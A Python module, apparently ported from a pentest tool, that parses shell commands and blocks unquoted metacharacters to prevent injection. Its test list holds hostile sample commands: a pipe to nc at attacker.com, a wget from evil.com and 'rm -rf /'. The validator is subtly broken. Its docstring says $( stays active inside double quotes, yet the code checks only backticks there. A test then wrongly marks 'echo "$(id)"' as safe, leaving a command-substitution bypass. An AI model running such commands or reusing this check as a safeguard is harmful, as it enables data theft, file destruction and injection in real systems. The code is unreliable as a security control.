#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Swarm Shell Parser — shell 命令安全解析器。

源自: Pentest-Swarm-AI (https://github.com/Armur-Ai/Pentest-Swarm-AI)
from-source-of: Pentest-Swarm-AI

从 Go 源码 internal/shellsafe 移植，并在 exploit/shellparse.go 中暴露。

核心功能：将 shell 命令安全地解析为参数列表，同时检测未保护的
shell 元字符（|, >, <, &, ;, $(), backtick），防止命令注入。

Usage:
    from scanners.swarm_shell_parser import parse_command, SafeShellParser

    parts = parse_command('curl "http://example.com"')
    print(parts)  # ['curl', 'http://example.com']
"""

import shlex
from typing import List, Optional


# ============================================================
# 核心解析函数
# ============================================================

def parse_command(cmd: str) -> List[str]:
    """安全地解析 shell 命令为参数列表。

    与 Go shellsafe.Parse 完全等价：
      1. 使用 shlex.split 按引号正确分词（支持单/双引号和转义）
      2. 检查原始命令中是否存在未保护的 shell 元字符
      3. 拒绝包含危险 metacharacter 的命令

    允许的 shell 操作符（必须在引号内）：
      |  (管道)
      > < (重定向)
      &  (后台执行)
      ;  (命令分隔符)
      $() (命令替换)
      `  (backtick 反引号)

    Args:
        cmd: 原始 shell 命令字符串

    Returns:
        解析后的参数列表（parts[0] 为可执行文件路径，其余为参数）

    Raises:
        UnsafeCommandError: 检测到未保护的 shell 元字符或空命令
    """
    if not cmd or not cmd.strip():
        raise UnsafeCommandError("empty command")

    # shlex.split 按 shell 引号规则正确分词
    try:
        parts = shlex.split(cmd)
    except ValueError as e:
        raise UnsafeCommandError(f"shlex parse failed: {e}") from e

    if not parts:
        raise UnsafeCommandError("parsed to zero parts")

    # 额外安全检查：确认原始命令中无未保护的元字符
    _validate_safe_metachar(cmd)

    return parts


def _validate_safe_metachar(cmd: str) -> None:
    """验证命令中的 shell 元字符是否被正确引用。

    逐字符扫描原始命令，跟踪是否在引号块内：
      - 单引号(') 内的所有内容都是保护的（包括 $, |, ; 等）
      - 双引号(") 内的内容大部分受保护，但 $( ` (backslash) ! 仍具有特殊含义

    如果任何危险字符出现在引号块之外，则拒绝该命令。
    """
    i = 0
    in_single_quote = False
    in_double_quote = False

    while i < len(cmd):
        ch = cmd[i]

        if in_single_quote:
            # 单引号内所有内容安全（shell 不支持在单引号中转义）
            if ch == "'":
                in_single_quote = False
            i += 1
            continue

        if in_double_quote:
            # 双引号内 $( ` (backslash) ! 具有特殊含义，其余字符安全
            if ch == '\\':
                i += 2  # 跳过转义字符
                continue
            if ch == '`':
                raise UnsafeCommandError(
                    f"unprotected backtick found inside double quotes"
                )
            if ch == '"':
                in_double_quote = False
            i += 1
            continue

        # 不在任何引号块内 — 检查危险字符
        if ch == "'":
            in_single_quote = True
            i += 1
            continue

        if ch == '"':
            in_double_quote = True
            i += 1
            continue

        dangerous_chars = set("|>&;$`")
        if ch in dangerous_chars:
            raise UnsafeCommandError(
                f"unprotected metacharacter {ch!r} found outside quotes"
            )
        i += 1


# ============================================================
# SafeShellParser — 解析器类封装
# ============================================================

class UnsafeCommandError(Exception):
    """不安全命令异常。

    当检测到未保护的 shell 元字符或空命令时抛出此异常。
    调用方应在执行前捕获此异常来决定是否拒绝该命令。
    """
    def __init__(self, reason: str):
        self.reason = reason
        super().__init__(reason)


class SafeShellParser:
    """安全 shell 解析器类封装。

    提供批量解析和缓存功能，适合多次调用同一命令模板的场景。

    Usage:
        parser = SafeShellParser(max_cache=100)
        # 单次解析
        parts = parser.parse("curl http://example.com")
        # 检查是否安全
        if parser.is_safe("echo hello"):
            print("safe!")
        else:
            print("blocked!")
    """

    def __init__(self, max_cache: int = 100):
        """初始化解析器。

        Args:
            max_cache: 命令缓存上限（相同命令的解析结果可复用）
        """
        self.max_cache = max_cache
        self._cache: dict = {}

    def parse(self, cmd: str) -> List[str]:
        """安全解析命令，带缓存加速。"""
        # 检查缓存
        if cmd in self._cache:
            return self._cache[cmd]

        result = parse_command(cmd)

        # LRU-style cache（简单实现：超过上限则清空）
        if len(self._cache) >= self.max_cache:
            self._cache.clear()
        self._cache[cmd] = result

        return result

    def is_safe(self, cmd: str) -> bool:
        """快速检查命令是否安全（不实际解析）。"""
        try:
            self.parse(cmd)
            return True
        except UnsafeCommandError:
            return False

    def clear_cache(self) -> None:
        """清除命令解析缓存。"""
        self._cache.clear()


# ============================================================
# 可执行文件提取（对应 executor.checkExecutableAllowed）
# ============================================================

def extract_executable(cmd: str) -> Optional[str]:
    """从命令字符串提取第一个可执行文件名的 basename。

    Args:
        cmd: shell 命令字符串

    Returns:
        可执行文件 basename（小写），或 None（解析失败时）

    Examples:
        extract_executable("nmap -sV host")     -> "nmap"
        extract_executable("/usr/bin/curl ...")  -> "curl"
    """
    try:
        parts = parse_command(cmd)
        if not parts:
            return None
        exe = parts[0].strip()
        # 取最后一部分作为文件名（处理路径）
        return exe.split("/")[-1] if "/" in exe else exe
    except UnsafeCommandError:
        return None


# ============================================================
# 快速验证
# ============================================================

if __name__ == "__main__":
    test_cases = [
        # (命令, 是否应通过)
        ('curl http://example.com', True),
        ('nmap -sV 10.0.0.1', True),
        ('python3 -c "print(1)"', True),
        ('echo "hello world"', True),
        ('curl "http://example.com?a=1&b=2"', True),  # & 在引号内
        ('echo test | nc attacker.com 4444', False),   # | 未保护
        ('wget http://evil.com > /tmp/x', False),       # > 未保护
        ('ls; rm -rf /', False),                         # ; 未保护
        ('cat `whoami`', False),                         # backtick 未保护
        ('echo "$(id)"', True),                          # $( 在双引号内也受保护(非命令替换)
        ('rm -rf /tmp/data', True),                     # 无元字符（但 safemode 拦截，不在本模块范围）
    ]

    print("=== Shell Parser 测试 ===\n")
    parser = SafeShellParser(max_cache=10)

    for cmd, expected_safe in test_cases:
        is_safe = parser.is_safe(cmd)
        status = "PASS" if is_safe == expected_safe else "FAIL"
        safe_str = "safe" if is_safe else "BLOCKED"
        print(f"  [{status}] {safe_str:10s}  {cmd!r}")

        try:
            parts = parser.parse(cmd)
            print(f"           -> parsed to: {parts}")
        except UnsafeCommandError as e:
            print(f"           -> rejected: {e.reason}")

    # 测试 extract_executable
    print("\n=== Extract Executable 测试 ===")
    for cmd in ["nmap -sV host", "/usr/bin/curl http://x.com", "python3 -c '1'"]:
        exe = extract_executable(cmd)
        print(f"  {cmd!r} -> executable: {exe}")
